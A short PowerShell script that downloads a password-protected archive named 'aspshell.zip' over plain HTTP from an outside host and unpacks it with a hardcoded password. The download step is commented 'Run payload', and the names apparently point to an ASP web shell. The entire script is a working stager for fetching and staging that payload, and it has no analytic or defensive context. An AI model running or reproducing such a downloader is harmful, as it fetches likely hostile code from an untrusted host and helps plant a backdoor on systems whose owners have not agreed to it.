############
# AspShell.Extract.ps1
# Unencrypt and Unpack the aspshell.zip file
############

$PASS="szbeck"
$File="aspshell.zip"

$PSScriptRoot = Split-Path $MyInvocation.MyCommand.Path -Parent

$FilePath = Join-Path -Path $PSScriptRoot -ChildPath $File
$anURL= "http://win.netip4.ru/Apps/smbshare/NIT/atHost/Scripts/DownloadFile.ashx?file=" + $File
$wc = New-Object System.Net.WebClient



# Run payload
$wc.DownloadFile( ${anURL}, ${FilePath})
& C:\Util\unzip.exe -o -P ${PASS} ${FilePath} -d ${PSScriptRoot}
